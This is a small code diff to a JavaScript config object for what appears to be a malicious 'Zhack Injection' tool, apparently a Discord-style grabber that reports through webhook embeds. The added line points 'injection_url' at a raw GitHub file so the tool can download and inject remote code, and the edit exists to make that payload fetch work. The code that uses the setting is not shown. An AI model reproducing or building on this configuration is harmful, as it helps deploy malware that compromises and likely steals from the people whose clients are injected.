@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Zhack Injection', 
   embed_icon: 'https://raw.githubusercontent.com/ByteSleuths/Img/main/Img/aaaaaaaaaaaa.png', 
   embed_color: 2895667, 
-  injection_url: 'https://github.com/ByteSleuths/Injection/blob/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/ByteSleuths/Injection/main/index.js', 
   /**
    
    **/
